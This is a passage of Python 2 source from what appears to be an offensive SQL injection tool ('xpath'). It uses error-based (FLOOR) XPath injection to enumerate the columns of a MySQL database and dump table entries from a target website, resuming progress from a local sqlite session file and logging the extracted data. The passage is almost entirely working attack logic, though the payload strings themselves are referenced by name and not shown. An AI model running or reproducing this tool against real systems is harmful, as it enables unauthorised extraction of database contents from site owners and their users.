			ses  = "%s/%s" % (self._tgt, self._SFile) if os.name is "posix" else  "%s\\%s" % ((self._tgt).replace("\/","\\"), self._SFile)
			self._PathSession = ses

		

		try:
			PrevSession = sqlite.SessionShow(self._PathSession, _tableSession)
		except (Exception, IOError) as e:

			try:
				__dlist, __ = self.XpathInject(_flag, _colList, Name=_nameList, Payloads=_listPayload, Dbname=_dbName, TblName=_tblName)

			except Exception as e:
				print '\n' + compat_color.fw + compat_color.sb + "["+compat_strftime("%H:%M:%S")+"] [INFO] target is not vulnerable to error-based (FLOOR) injection try other techniques.."
			else:
				print compat_color.fg + compat_color.sb + "Database: %s" % (_dbName)
				self._logs += "Database: %s\n" % (_dbName)
				print compat_color.fg + compat_color.sb + "Table: %s" % (_tblName)
				self._logs += "Table: %s\n" % (_tblName)
				print compat_color.fg + compat_color.sb + "[%s columns]:" % (len(__dlist))
				self._logs += "[%s columns]:\n" % (len(__dlist))
				_columns 			= compat_prettytable(["Column"])
				_columns.align		= "l"
				_columns.header 	= True
				for col in __dlist:
					_columns.add_row([col])
				print compat_color.fg + compat_color.sb + "%s" % (_columns)
				self._logs += "%s\n" % (_columns)

		else:
			try:
				row = PrevSession[0] 
			except Exception as e:
				pass
			else:
				_param, _type, _title, _payload = row[1], row[2], row[3], row[4]


				print compat_color.fw + compat_color.sn + "xpath resumed the following injection point(s) from stored session:"
				self._logs += '\nxpath resumed the following injection point(s) from stored session:\n'
				print compat_color.fw + compat_color.sn + '---'
				self._logs += '---\n'
				print compat_color.fw + compat_color.sn + 'Parameter: (%s)' % (_param)
				self._logs += 'Parameter: (%s)\n' % (_param)
				print compat_color.fw + compat_color.sn + '\tType: %s' % (_type)
				self._logs += '\tType: %s\n' % (_type)
				print compat_color.fw + compat_color.sn + '\tTitle: %s' % (_title)
				self._logs += '\tTitle: %s\n' % (_title)
				print compat_color.fw + compat_color.sn + '\tPayload: %s' % (_payload)
				self._logs += '\tPayload: %s\n' % (_payload)
				print compat_color.fw + compat_color.sn + '---'
				self._logs += '---\n'


				req = compat_request(self._url, headers={'User-agent': user_agent_win if os.name is "win32" else user_agent_unix})
				resp = compat_urlopen(req, timeout=self._timeout)
				war, wsr = resp.headers.get('X-Powered-By') , resp.headers.get('Server')

				print compat_color.fw + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
				if war and wsr:
					print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web application technology: %s, %s" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
					self._logs += "web application technology: %s, %s\n" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
				else:
					print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % (wsr)
					self._logs += "web server technology: %s\n" % (wsr)


				try:
					colsCount = sqlite.SessionPrev(self._PathSession, _tableSession, (_colList[1]).replace(" TEXT", ""))[0][0]
				except Exception as e:


					_flag		= False
					_dlist, __  = self.XpathAdvance(_flag, _payload, _colList, Name=_nameList, Payloads=_listPayload, Dbname=_dbName, TblName=_tblName)
					print compat_color.fg + compat_color.sb + "Database: %s" % (_dbName)
					self._logs += "Database: %s\n" % (_dbName)
					print compat_color.fg + compat_color.sb + "Table: %s" % (_tblName)
					self._logs += "Table: %s\n" % (_tblName)
					print compat_color.fg + compat_color.sb + "[%s columns]:" % (len(_dlist))
					self._logs += "[%s columns]:\n" % (len(_dlist))
					_columns 			= compat_prettytable(["Column"])
					_columns.align		= "l"
					_columns.header 	= True
					for col in _dlist:
						_columns.add_row([col])
					print compat_color.fg + compat_color.sb + "%s" % (_columns)
					self._logs += "%s\n" % (_columns)

				else:
					print compat_color.fg + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] fetching %s" % (_nameList)
					print compat_color.fg + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % (colsCount)
					try:
						cols_names = (sqlite.SessionPrev(self._PathSession, _tableSession, (_colList[2]).replace(" TEXT", ""))[0][0]).split(",")
					except Exception as e:

						_flag	= True
						_dlist, __ = self.XpathAdvance(_flag, _payload, _colList, Payloads=_listPayload, total=colsCount, Dbname=_dbName, TblName=_tblName)
						print compat_color.fg + compat_color.sb + "Database: %s" % (_dbName)
						self._logs += "Database: %s\n" % (_dbName)
						print compat_color.fg + compat_color.sb + "Table: %s" % (_tblName)
						self._logs += "Table: %s\n" % (_tblName)
						print compat_color.fg + compat_color.sb + "[%s columns]:" % (len(_dlist))
						self._logs += "[%s columns]:\n" % (len(_dlist))
						_columns 			= compat_prettytable(["Column"])
						_columns.align		= "l"
						_columns.header 	= True
						for col in _dlist:
							_columns.add_row([col])
						print compat_color.fg + compat_color.sb + "%s" % (_columns)
						self._logs += "%s\n" % (_columns)
						
					else:
						if len(cols_names) == int(colsCount):

							print compat_color.fw + compat_color.sd + "Database: %s" % (_dbName)
							self._logs += "Database: %s\n" % (_dbName)
							print compat_color.fw + compat_color.sd + "Table: %s" % (_tblName)
							self._logs += "Table: %s\n" % (_tblName)
							print compat_color.fw + compat_color.sd + "[%s columns]:" % (colsCount)
							self._logs += "[%s columns]:\n" % (colsCount)
							_columns 			= compat_prettytable(["Column"])
							_columns.align		= "l"
							_columns.header 	= True
							for col in cols_names:
								_columns.add_row([col])
							print compat_color.fw + compat_color.sd + "%s" % (_columns)
							self._logs += "%s\n" % (_columns)

						else:
							_init  = len(cols_names)
							_total = int(colsCount)
							try:
								_retVal = (sqlite.SessionPrev(self._PathSession, _tablePayload, (_colList[0]).replace(" TEXT", ""))[0][0])
							except Exception as e:
								raise e
							else:
								for col in cols_names:
									print compat_color.fg + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] resumed: %s" % (col)
								_ch = ','.join(map(str, cols_names))
								_remaining, _, __dlist, __ = self.XpathDump(_init, _total, _retVal)
								_data = '"%s,%s"' % (_ch,_remaining)
								sqlite.SessionUpdate(self._PathSession, _tableSession, Col=(_colList[2]).replace(" TEXT",""), Data=_data)
								cols_names.extend(__dlist)

								print compat_color.fg + compat_color.sb + "Database: %s" % (_dbName)
								self._logs += "Database: %s\n" % (_dbName)
								print compat_color.fg + compat_color.sb + "Table: %s" % (_tblName)
								self._logs += "Table: %s\n" % (_tblName)
								print compat_color.fg + compat_color.sb + "[%s columns]:" % (len(cols_names))
								self._logs += "[%s columns]:\n" % (len(cols_names))
								_columns 			= compat_prettytable(["Column"])
								_columns.align		= "l"
								_columns.header 	= True
								for col in cols_names:
									_columns.add_row([col])
								print compat_color.fw + compat_color.sd + "%s" % (_columns)
								self._logs += "%s\n" % (_columns)
		with open(str(self._PathLogs), "a") as f:
			f.write(str(self._logs))
		f.close()
		print "\n" + compat_color.fg + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % (self._PathLogs)
		self._logs = ""
	def Dumps(self, Dbname=None, TblName=None, ColList=None):

		_flag  			= "advance"
		_tableSession   = self.tblSession
		_tablePayload	= self.tblPayload
		if Dbname and TblName and ColList:
			_dbName			= Dbname
			_tblName		= "`%s`" % (TblName)
			_colN 			= "%s" % (ColList if not " " in ColList else  (ColList.replace(" ",""))) 
			_colsDumpList 	= ("`%s`" % (ColList.replace(",","`,`") if not " " in ColList else  ((ColList.replace(" ","")).replace(",", "`,`")))).split(",")
			_colDtc			= "`%s_%sDataCount` TEXT" % (Dbname, TblName)
			_colDts 		= "`%s_%sDumps` TEXT" % (Dbname, TblName)
			_colList        = [self.colDtp, _colDtc, _colDts]
			_nameList       = "entries of column(s) '%s' for table '%s' in database '%s'" % (_colN,_tblName ,_dbName)
			_listPayload    = [REC_COUNT_FROM_TBL, REC_DUMP_FROM_TBL]

		if compat_exist(self._tgt):
			ses  = "%s/%s" % (self._tgt, self._SFile) if os.name is "posix" else  "%s\\%s" % ((self._tgt).replace("\/","\\"), self._SFile)
			self._PathSession = ses
		try:
			PrevSession = sqlite.SessionShow(self._PathSession, _tableSession)
		except (Exception, IOError) as e:

			try:
				__dlist = self.XpathInject(_flag, _colList, Name=_nameList, Payloads=_listPayload, Dbname=_dbName, TblName=_tblName, ColList=_colsDumpList)

			except Exception as e:
				print '\n' + compat_color.fw + compat_color.sb + "["+compat_strftime("%H:%M:%S")+"] [INFO] target is not vulnerable to error-based (FLOOR) injection try other techniques.."
			else:
				print compat_color.fg + compat_color.sb + "Database: %s" % (_dbName)
				self._logs += "Database: %s\n" % (_dbName)
				print compat_color.fg + compat_color.sb + "Table: %s" % (TblName)
				self._logs += "Table: %s\n" % (TblName) 
				print compat_color.fg + compat_color.sb + "%s" % (__dlist)
				self._logs += "%s\n" % (__dlist)

		else:
			try:
				row = PrevSession[0] 
			except Exception as e:
				pass
			else:
				_param, _type, _title, _payload = row[1], row[2], row[3], row[4]

				print compat_color.fw + compat_color.sn + "xpath resumed the following injection point(s) from stored session:"
				self._logs += '\nxpath resumed the following injection point(s) from stored session:\n'
				print compat_color.fw + compat_color.sn + '---'
				self._logs += '---\n'
				print compat_color.fw + compat_color.sn + 'Parameter: (%s)' % (_param)
				self._logs += 'Parameter: (%s)\n' % (_param)
				print compat_color.fw + compat_color.sn + '\tType: %s' % (_type)
				self._logs += '\tType: %s\n' % (_type)
				print compat_color.fw + compat_color.sn + '\tTitle: %s' % (_title)
				self._logs += '\tTitle: %s\n' % (_title)
				print compat_color.fw + compat_color.sn + '\tPayload: %s' % (_payload)
				self._logs += '\tPayload: %s\n' % (_payload)
				print compat_color.fw + compat_color.sn + '---'
				self._logs += '---\n'


				req = compat_request(self._url, headers={'User-agent': user_agent_win if os.name is "win32" else user_agent_unix})
				resp = compat_urlopen(req, timeout=self._timeout)
				war, wsr = resp.headers.get('X-Powered-By') , resp.headers.get('Server')

				print compat_color.fw + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
				if war and wsr:
					print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web application technology: %s, %s" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
					self._logs += "web application technology: %s, %s\n" % (war, wsr[0:14] if 'Apache' in wsr else wsr)
				else:
					print compat_color.fw + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % (wsr)
					self._logs += "web server technology: %s\n" % (wsr)

				try:
					dataCount = sqlite.SessionPrev(self._PathSession, _tableSession, (_colList[1]).replace(" TEXT", ""))[0][0]
				except Exception as e:


					_flag		= False
					_dlist  = self.XpathAdvance(_flag, _payload, _colList, Name=_nameList, Payloads=_listPayload, Dbname=_dbName, TblName=_tblName, ColsList=_colsDumpList)
					print compat_color.fg + compat_color.sb + "Database: %s" % (_dbName)
					self._logs += "Database: %s\n" % (_dbName)
					print compat_color.fg + compat_color.sb + "Table: %s" % (TblName)
					self._logs += "Table: %s\n" % (TblName) 
					print compat_color.fg + compat_color.sb + "%s" % (_dlist)
					self._logs += "%s\n" % (_dlist)

				else:
					print compat_color.fg + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] fetching %s" % (_nameList)
					print compat_color.fg + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % (dataCount)
					try:
						data_dumped = sqlite.SessionDumpShow(self._PathSession, _tblName, ColList)
					except Exception as e:

						_flag	= True
						_dlist = self.XpathAdvance(_flag, _payload, _colList, Payloads=_listPayload, total=dataCount, Dbname=_dbName, TblName=_tblName, ColsList=_colsDumpList)
						print compat_color.fg + compat_color.sb + "Database: %s" % (_dbName)
						self._logs += "Database: %s\n" % (_dbName)
						print compat_color.fg + compat_color.sb + "Table: %s" % (TblName)
						self._logs += "Table: %s\n" % (TblName) 
						print compat_color.fg + compat_color.sb + "%s" % (_dlist)
						self._logs += "%s\n" % (_dlist)
						
					else:
						if len(data_dumped) == int(dataCount):
							print compat_color.fw + compat_color.sd + "Database: %s" % (_dbName)
							self._logs += "Database: %s\n" % (_dbName)
							print compat_color.fw + compat_color.sd + "Table: %s" % (TblName)
							self._logs += "Table: %s\n" % (TblName) 
							cursor = sqlite.ShowPrettySession(self._PathSession, _tblName, Cols=ColList)
							_tabulate = compat_cursor(cursor)
							sqlite.ShowPrettySession(self._PathSession, _tblName, flag=False,Cols=ColList)
							print compat_color.fw + compat_color.sd + "%s" % (_tabulate)
							self._logs += "%s\n" % (_tabulate)

						else:
							_init  = len(data_dumped)
							_total = int(dataCount)
							try:
								_retVal = (sqlite.SessionPrev(self._PathSession, _tablePayload, (_colList[0]).replace(" TEXT", ""))[0][0])
							except Exception as e:
								raise e
							else:
								for _col in data_dumped:
									for _d in _col:
										print compat_color.fg + compat_color.sd + "["+compat_strftime("%H:%M:%S")+"] [INFO] resumed: %s" % (_d)
								_,_ = self.XpathDataDump(_init, _total, _retVal, Table=_tblName, Dbname=_dbName, Coltodump=_colsDumpList, flag=False)
								print compat_color.fg + compat_color.sb + "Database: %s" % (_dbName)
								self._logs += "Database: %s\n" % (_dbName)
								print compat_color.fg + compat_color.sb + "Table: %s" % (TblName)
								self._logs += "Table: %s\n" % (TblName) 
								cursor = sqlite.ShowPrettySession(self._PathSession, _tblName, Cols=ColList)
								_tabulate = compat_cursor(cursor)
								sqlite.ShowPrettySession(self._PathSession, _tblName, flag=False,Cols=ColList)
								print compat_color.fg + compat_color.sb + "%s" % (_tabulate)
								self._logs += "%s\n" % (_tabulate)
		with open(str(self._PathLogs), "a") as f:
			f.write(str(self._logs))
		f.close()
		print "\n" + compat_color.fg + compat_color.sn + "["+compat_strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % (self._PathLogs)
		self._logs = ""